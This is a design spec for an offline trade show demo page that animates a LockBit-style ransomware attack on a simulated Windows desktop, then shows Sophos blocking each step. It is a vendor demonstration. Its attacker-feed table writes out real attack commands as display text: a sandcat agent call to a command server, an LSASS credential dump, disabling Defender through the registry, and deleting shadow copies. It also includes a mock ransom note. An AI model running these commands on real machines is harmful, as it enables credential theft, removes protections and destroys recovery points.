# Trade Show Demo Mode — Design Spec

## Overview

A self-running scripted attack simulation that works without live infrastructure. Built for trade show booths and unmanned displays. No CALDERA, no victim VMs, no sandcat agents required — everything is pre-scripted and animated in the browser.

The demo tells a two-chapter story:
- **Chapter 1**: A real-looking ransomware attack succeeds on an unprotected machine
- **Chapter 2**: The same attack is blocked at every layer by Sophos

---

## Goals

- Works on any laptop with a browser — no Docker, no VMs, no network required
- Readable from 10–15 feet on a large trade show screen
- SE can take over from keyboard at any point mid-loop
- Unmanned: loops continuously at a booth with no interaction required
- Authentic: Windows 11 UI, real MITRE technique IDs, real Sophos branding

---

## File Location

`adversary-sim/nginx/html/demo.html`

Served at `http://localhost:8081/demo.html`. A **Demo Mode** button (pill style, cyan accent `#00e5ff`) is added to `index.html` top navigation — both the desktop `.main-nav` tab row and the mobile `.nav-wrap` hamburger menu — that opens `demo.html` in a new tab.

**`demo.html` must NOT import `shared.css`** — it uses its own self-contained styles. All fonts are system fonts only (no Google Fonts CDN) so the page works fully offline:

| Context | Font stack |
|---------|-----------|
| UI / Windows chrome | `'Segoe UI', system-ui, -apple-system, sans-serif` |
| Terminal body | `'Cascadia Code', 'Cascadia Mono', 'Courier New', monospace` |

`Segoe UI` renders correctly on Windows trade show machines. On macOS (SE's own laptop), `system-ui` is an acceptable substitute — the overall visual reads as Windows because of the chrome, colors, and layout, not the font family alone.

---

## Page Setup

```html
<title>Sophos Demo Mode</title>
<!-- favicon: Sophos shield blue 16x16 -->
```

The page uses `100vw × 100vh`, `overflow: hidden`, no body padding. Minimum viable width: 1280px. Below 900px, the two panels stack vertically (attacker feed on top, victim desktop below). This handles projectors and laptop screens if the SE shares their screen unexpectedly.

---

## Layout

```
┌──────────────────────────────────────────────────────────┐
│  CHAPTER HEADER BAR  (chapter pill · title · op timer)   │
├──────────────────────┬───────────────────────────────────┤
│                      │                                   │
│   ATTACKER FEED      │   VICTIM DESKTOP (Windows sim)    │
│   (left panel)       │   (right panel)                   │
│   flex: 1            │   flex: 1                         │
│                      │                                   │
├──────────────────────┴───────────────────────────────────┘
(taskbar is inside the victim desktop panel, absolute bottom)
```

Header bar: `48px` fixed height. Panels fill remaining `calc(100vh - 48px)`.

---

## Timing Reference

All durations in milliseconds. These are the canonical values — do not deviate.

### Chapter 1 — Ability Sequence Timing

Abilities animate sequentially. Each ability has two phases: RUNNING (visible for a beat) then DONE.

| Event | Delay from chapter start (ms) |
|-------|-------------------------------|
| Chapter starts, ability 1 pre-rendered as DONE (sandcat deploy) | 0 |
| Ability 2 (LSASS) appears as RUNNING | 800 |
| Ability 2 → DONE | 1600 |
| Ability 3 (Defender) appears as RUNNING | 2200 |
| Ability 3 → DONE | 3000 |
| Ability 4 (Shadow copies) appears as RUNNING | 3500 |
| Ability 4 → DONE | 4200 |
| Ability 5 (LockBit) appears as RUNNING | 4800 |
| PS terminal: lines 1–2 appear (Initializing, Scanning) | 4900 |
| PS terminal: line 3 appears (file 1 LOCKED) | 5600 |
| PS terminal: line 4 appears (file 2 LOCKED) | 6100 |
| PS terminal: line 5 appears (file 3 LOCKED) | 6600 |
| PS terminal: line 6 appears (file 4 LOCKED) | 7100 |
| PS terminal: line 7 appears (847 files encrypted) | 7600 |
| Ability 5 → DONE | 7700 |
| Desktop background transitions to black (0.8s CSS transition) | 7800 |
| Ransom wallpaper fades in (1s CSS transition) | 7900 |
| PowerShell window fades out (0.4s CSS transition) | 8000 |
| Notepad window slides in (0.5s CSS transition, translateY -10px → 0) | 8500 |
| Notepad taskbar button appears | 8500 |
| Chapter 1 climax hold (SE reads the ransom note) | — |
| Auto-loop pause before Chapter 2 | 5000 after climax |

### Chapter 2 — Block Sequence Timing

Chapter 2 left panel opens with the same sandcat deploy card pre-rendered as DONE (same as Ch1 — the agent got onto the machine before Sophos started blocking). The remaining 4 abilities start as WAITING.

| Event | Delay from chapter start (ms) |
|-------|-------------------------------|
| Chapter starts, sandcat deploy card shown as DONE | 0 |
| Abilities 2–5 pre-rendered as WAITING rows | 0 |
| Block counter pill appears ("0 blocked") | 0 |
| Ability 2 (LSASS) → RUNNING | 800 |
| Ability 2 → BLOCKED, block counter → "1 blocked" | 1500 |
| Toast: "Credential Theft Blocked" slides in | 1600 |
| PS terminal: BLOCKED line 1 (credential dump prevented) | 1700 |
| Toast fades out | 3200 |
| Ability 3 (Defender) → RUNNING | 3600 |
| Ability 3 → BLOCKED, block counter → "2 blocked" | 4200 |
| Ability 4 (Shadow copies) → RUNNING | 4500 |
| Ability 4 → BLOCKED, block counter → "3 blocked" | 5100 |
| Toast: "Tamper Protection Active" slides in | 5200 |
| PS lines for blocks 2 and 3 appear | 5300 |
| Toast fades out | 6700 |
| Ability 5 (LockBit) → RUNNING | 7000 |
| PS terminal: "Attempting file encryption..." | 7100 |
| Ability 5 → STOPPED (final), block counter → "4 of 4 blocked" | 7800 |
| PS lines for block 4 appear | 7900 |
| Toast: "File Encryption Blocked" slides in | 8000 |
| Toast fades out | 10000 |
| Expanded Sophos alert slides in | 10350 |
| Chapter 2 climax hold | — |
| Auto-loop pause before Chapter 1 | 6000 after climax |

---

## Stages (for Keyboard Control)

A **stage** is one discrete advance point. `Space` moves to the next stage. Stages in order:

**Chapter 1 stages:**
1. Reset state (all abilities WAITING except sandcat DONE, PS terminal shows only the command line: `PS C:\Users\demo\Documents> .\lockbit3.exe --target C:\Users\demo` — no output lines yet)
2. Ability 2 DONE (LSASS complete)
3. Ability 3 DONE (Defender disabled)
4. Ability 4 DONE (Shadow copies deleted)
5. Ability 5 RUNNING + PS encrypting lines appearing
6. Climax: wallpaper + Notepad deployed (Chapter 1 end)

**Chapter 2 stages:**
1. Reset state (sandcat DONE, abilities 2–5 WAITING)
2. Block 1: LSASS blocked + toast
3. Block 2 & 3: Defender + shadow copies blocked + toast
4. Block 4: LockBit stopped + toast
5. Climax: expanded Sophos alert (Chapter 2 end)

`Space` at the end of Chapter 2 (stage 5) does nothing (no-op) — SE must press `2` to restart or `1` to go to Chapter 1.

---

## Keyboard Controls

| Key | Action |
|-----|--------|
| `Space` | Advance to next stage (interrupts auto-loop, enters manual mode) |
| `1` | Jump to Chapter 1, stage 1 (reset and pause) |
| `2` | Jump to Chapter 2, stage 1 (reset and pause) |
| `R` | Reset current chapter to stage 1 (stay in same chapter) |
| `L` | Resume auto-loop from current position |
| `F` | Toggle fullscreen (`document.documentElement.requestFullscreen()`) |

**Takeover behavior:** When a key is pressed, any in-progress setTimeout/animation chain is cancelled immediately (using a `clearAllTimers()` function that clears all registered timer IDs). The UI snaps to the nearest clean stage boundary — no half-rendered states. All CSS transitions complete at their natural speed (not cancelled).

**Key hint overlay:** On first page load, a small semi-transparent pill appears bottom-center for 4s then fades: `Space  ·  1  ·  2  ·  R  ·  L  ·  F`. Never shown again in that browser session (sessionStorage flag).

---

## Chapter 1 — Unprotected: The Attack Succeeds

### Header Bar
- Red pill badge: `⚠ Chapter 1` (`rgba(255,50,50,0.15)` bg, `#ff6666` text)
- Title: "Unprotected — The Attack Succeeds"
- Subtitle: "No endpoint protection · LockBit 3.0 ransomware"
- Op timer counting up from `00:00` (live, counts seconds from chapter start)

### Left Panel — Attacker Feed

Background: `#0d1117`. Border: `1px solid rgba(255,50,50,0.2)`. Header dot: red, blinking.

All 5 ability cards pre-render on chapter load. Ability 1 (sandcat deploy) is pre-rendered as DONE. Abilities 2–5 start as WAITING.

Each card layout:
```
[timestamp]  [tactic label]           [STATUS BADGE]
             [ability name]
             [command snippet — monospace, smaller, dimmed]
```

| # | Tactic | Name | Command |
|---|--------|------|---------|
| 1 | Execution | Sandcat agent deployed on victim | `splunkd.exe -server http://192.168.1.63:8888 -group red` |
| 2 | Credential Access | LSASS memory dump — credential harvest | `rundll32.exe comsvcs.dll MiniDump 624 lsass.dmp full` |
| 3 | Defense Evasion | Windows Defender disabled via registry | `reg add "HKLM\...\Windows Defender" /v DisableAntiSpyware /d 1` |
| 4 | Defense Evasion | Shadow copies deleted — no rollback | `vssadmin.exe delete shadows /all /quiet` |
| 5 | Impact · T1486 | Data encrypted for impact — LockBit 3.0 | `.\lockbit3.exe --target C:\Users\demo --threads 8` |

Status badge states: `WAITING` (gray) → `RUNNING` (amber) → `DONE` (red/dim).

DONE items: `opacity: 0.5`.
ACTIVE/RUNNING item: `border-left: 2px solid #ffb400`, amber background tint.

### Right Panel — Victim Desktop

**Normal state (Phase A):** Dark blue gradient wallpaper (`linear-gradient(140deg, #1b3d6e, #0e2448, #071830)`).

**PowerShell window:**
- Position: `absolute; top: 14px; left: 12px; width: 88%`
- Title bar: `#1a1a1a`, height `30px`, PS icon SVG left + title text + SVG controls right
- Body: `#012456`, `13px` font, `1.75` line-height, `150px` height

PS terminal lines (appear per timing table above):
```
PS C:\Users\demo\Documents> .\lockbit3.exe --target C:\Users\demo
Initializing encryption engine...
Scanning 847 files across 23 directories...
Encrypting report_Q1.docx ... LOCKED          ← orange #ce9178
Encrypting financials_2025.xlsx ... LOCKED
Encrypting contracts_signed.pdf ... LOCKED
Encrypting employee_data.xlsx ... LOCKED
847 files encrypted. Ransom note deployed.    ← red #f14c4c
```

**Climax (Phase B):** Per timing table:
1. Desktop background transitions to `#080808`
2. Ransom wallpaper fades in (centered, full panel):
   - Skull emoji 36px
   - "YOUR FILES HAVE BEEN ENCRYPTED" — `#cc0000`, `Courier New`, 18px bold, text-shadow glow
   - 2-line subtext — `rgba(255,255,255,0.45)`, 10px
   - Live countdown timer `71:59:47` counting down every second — `#ff3333`, 22px bold, text-shadow glow
   - Label: "Time remaining to pay"
   - Victim ID line: `VICTIM-ID: 8F2A9C-447B-E91D-CC38 · README_RESTORE_FILES.txt`
3. PowerShell window fades out
4. Notepad window slides in (positioned top:40px left:30px, width 82%):
   - Title bar: `#2c2c2c`, filename `README_RESTORE_FILES.txt — Notepad`
   - Menu bar: `#1e1e1e` with File / Edit / View items
   - Body: `#180000`, `Courier New` 10px
   - Content: LockBit ransom text (see below)
5. Taskbar: "README_RESTORE_FILES.txt" app button appears

**Ransom note text:**
```
~~~ LOCKBIT 3.0 ~~~
================================================
All your files have been encrypted with AES-256 + RSA-2048.
There is no recovery without our decryption key.

You have 72 hours to contact us or your data
will be published to our leak site.

http://lockbit3[.]onion/decrypt/8f2a9c
VICTIM-ID: 8F2A9C-447B-E91D-CC38-5502AB | FILES: 847 | SIZE: 4.2GB
```

(The `.onion` URL is deliberately bracket-defanged — not a live link.)

**Taskbar (Chapter 1):** ⊞ · PowerShell app · README_RESTORE_FILES.txt app (appears at climax) · live clock

---

## Chapter 2 — Sophos Protected: Every Layer Blocked

### Header Bar
- Blue pill badge: `🛡 Chapter 2` (`rgba(0,101,189,0.15)` bg, `#6ab4ff` text)
- Title: "Sophos Protected — Every Layer Blocked"
- Subtitle: "Intercept X · CryptoGuard · Tamper Protection"
- Op timer: resets to `00:00` at Chapter 2 start and counts up from there (same behavior as Chapter 1)

### Left Panel — Attacker Feed

Same panel layout. Border: `1px solid rgba(255,255,255,0.08)`. Header dot: amber, blinking.

**Opening state:** Sandcat deploy card pre-rendered as DONE (same as Ch1 — the agent reached the machine before Sophos engaged). Abilities 2–5 start as WAITING. Block counter pill visible at top: "0 blocked" (`rgba(0,101,189,0.08)` bg).

**Blocked card appearance:**
- `border-left: 2px solid #0065BD`
- Blue background tint: `rgba(0,101,189,0.06)`
- Ability name: struck through (`text-decoration: line-through`)
- Tactic label prefixed: `🛡 BLOCKED · <Tactic>`
- Status badge: `BLOCKED` in blue, or `STOPPED` for ability 5 (green tint)
- Block reason line below name (smaller, blue): e.g. `🛡 Intercept X — Credential theft protection triggered`

Block sequence and reasons:
| # | Ability | Block reason |
|---|---------|-------------|
| 2 | LSASS dump | `🛡 Intercept X — Credential theft protection triggered` |
| 3 | Defender disable | `🛡 Tamper Protection — Registry modification blocked` |
| 4 | Shadow copies | `🛡 CryptoGuard — Shadow copy deletion blocked` |
| 5 | LockBit encryption | `🛡 CryptoGuard — Ransomware process terminated · Files restored` |

Block counter reads: `1 blocked` / `2 blocked` / `3 blocked` / `4 of 4 blocked`.

### Right Panel — Victim Desktop

Desktop wallpaper stays normal (blue gradient) throughout — never changes to black.

PowerShell window stays visible. Lines appear as each block fires:
```
PS C:\Users\demo\Documents> .\lockbit3.exe --target C:\Users\demo
BLOCKED: Sophos Intercept X terminated process          ← blue #6ab4ff
Access denied — credential dump prevented
BLOCKED: Registry modification prevented by Tamper Protection
BLOCKED: Shadow copy deletion denied by CryptoGuard
Attempting file encryption...                           ← orange #ce9178
ERROR: Access denied — CryptoGuard intercepted attempt  ← red #f14c4c
Rolling back 0 file(s)... No files encrypted.           ← teal #4ec9b0
```

**"Sophos Endpoint · Active"** shown in victim panel header (right-aligned, with Sophos shield SVG 14px).

**Taskbar:** ⊞ · PowerShell app · "Sophos Endpoint · Protected" app (blue tint, Sophos shield icon, always visible) · live clock

### Sophos Alert Sequence

**Phase 1 — Toast (220px, bottom-right above taskbar):**
- `#1f1f1f` background
- `#0065BD` 3px top accent bar
- Sophos shield SVG 32px
- App name: "Sophos Endpoint" (9px, dimmed)
- Title: "File Encryption Blocked" (12px bold, white)
- Body: "Ransomware activity detected and stopped. Files are safe."
- Slides in: `transform: translateX(12px) → 0`, `opacity: 0 → 1`, 300ms ease

**Toast messages per block:**
- Block 1 toast: "Credential Theft Blocked" / "LSASS memory access prevented by Intercept X."
- Block 2+3 toast: "Tamper Protection Active" / "Registry change + shadow copy deletion blocked."
- Block 4 toast (final): "File Encryption Blocked" / "Ransomware stopped. Files are safe."

Only one toast is visible at a time. Earlier toasts fade before the next appears.

**Phase 2 — Expanded Alert (300px, same bottom-right position):**
- `#202020` background, `border-radius: 10px`
- `#0065BD` 3px top bar
- Header: Sophos shield 36px + "Sophos Intercept X · CryptoGuard" label + "Ransomware Blocked" title (15px, white)
- Green status banner (pulsing animation): checkmark icon + "Threat Neutralized" (13px, `#6CCB5F`) + "0 files encrypted · 4 attacks blocked" (11px, dimmed)
- Description: "CryptoGuard detected and stopped lockbit3.exe. All 4 attack techniques were blocked across credential access, tamper protection, and encryption prevention."
- Two detail chips: `Attacks blocked: 4 of 4` | `Files encrypted: 0` (green)
- Footer: "Powered by Sophos Endpoint" + Dismiss button + "View in Sophos Central" button (Sophos blue)

---

## Sophos Branding

### Shield SVG (32px variant — toast)
```svg
<svg width="32" height="32" viewBox="0 0 32 32" fill="none">
  <rect width="32" height="32" rx="6" fill="#0065BD"/>
  <path d="M16 4L6 8.5V16.5C6 21.8 10.4 26.7 16 28C21.6 26.7 26 21.8 26 16.5V8.5L16 4Z"
        fill="white" fill-opacity="0.15"/>
  <path d="M16 5.5L7 9.7V16.8C7 21.6 11 26.1 16 27.3C21 26.1 25 21.6 25 16.8V9.7L16 5.5Z"
        fill="white" fill-opacity="0.08"/>
  <text x="16" y="21" text-anchor="middle"
        font-family="'Segoe UI',Arial,sans-serif" font-size="13"
        font-weight="800" fill="white">S</text>
</svg>
```

Scale to 36px or 40px for the expanded alert by changing only the `width` and `height` attributes — leave `viewBox="0 0 32 32"` unchanged. SVG scales automatically. The `<text>` element is intentional — it renders the "S" identically to the real Sophos mark at these sizes.

### Color Palette

| Element | Value |
|---------|-------|
| Sophos blue | `#0065BD` |
| Windows dark bg | `#202020` |
| Windows title bar | `#1a1a1a` |
| PowerShell body | `#012456` |
| Success green | `#6CCB5F` |
| Block blue (text) | `#6ab4ff` |
| Ransom red | `#cc0000` |
| Platform bg | `#0a0e18` |
| Encrypting orange | `#ce9178` |
| Error red | `#f14c4c` |
| Teal (ok) | `#4ec9b0` |

---

## Windows 11 UI Rules

1. **Title bar**: `#1a1a1a`, `30px–34px` height. PS icon SVG on left. Title text centered/flex-1. Window controls right-aligned.
2. **Window controls**: Three `div.ps-winbtn` each `46px × 34px`. SVG icons: `─` (minimize, horizontal line), `□` (maximize, rect), `✕` (close, two diagonal lines). `stroke: rgba(255,255,255,0.65)`, `stroke-width: 1.2`, `fill: none`. Hover: `rgba(255,255,255,0.1)` bg. Close hover: `#c42b1c` bg.
3. **No macOS traffic lights** anywhere.
4. **PowerShell body**: `#012456` always, `Cascadia Code / Courier New`, minimum `11px`.
5. **Taskbar**: `36–40px` height, `rgba(10,14,24,0.97)` bg, `backdrop-filter: blur(12px)`. Start button `⊞`, app chips, clock right-aligned. Clock is a live JavaScript clock (`setInterval` 1s).

**Note on victim IP:** `192.168.1.45` is used as a display prop in the victim panel header and ransom note to look like a real local network address. It is not connected to any lab infrastructure. This is intentional.

---

## Auto-Loop

```
[Chapter 1 plays] → [5s pause] → [Chapter 2 plays] → [6s pause] → [Chapter 1 plays] → ...
```

Implemented as a single `runLoop()` function using a queue of `setTimeout` calls. All timer IDs are pushed to a `window._demoTimers = []` array. `clearAllTimers()` iterates and clears every ID. Any keypress calls `clearAllTimers()` before snapping to the target stage.

---

## What This Is NOT

- Not a live attack — no CALDERA, no sandcat, no victim VM required
- Not a replacement for the live demo — positioned as "when you can't run live"
- Not a slide deck — fully animated, interactive
